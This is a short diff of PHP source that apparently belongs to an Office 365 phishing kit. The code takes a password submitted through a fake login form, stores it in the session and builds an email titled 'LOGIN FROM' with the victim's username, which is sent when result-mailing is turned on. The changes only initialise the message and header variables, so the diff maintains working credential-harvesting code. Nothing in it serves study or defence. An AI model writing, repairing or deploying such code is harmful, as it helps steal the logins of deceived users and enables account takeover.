@@ -19,7 +19,7 @@ include('../functions/get_ip.php');
 
 
 $_SESSION['password'] = $_POST['passwd'];
-
+$Z118_MESSAGE = "";
 $Z118_MESSAGE .= "
 	
 	[ OFFICE365 ACCOUNT LOGIN]
@@ -50,7 +50,7 @@ $Z118_MESSAGE .= "
 	}
 
 	if ($send_results_to_email === "on") {
-
+		$Z118_HEADERS = "";
 		$Z118_SUBJECT = "✪ LOGIN FROM : ✪ ".$_SESSION['username']." ✪";
 		$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
 		$Z118_HEADERS .= $_SESSION['username']."\n";
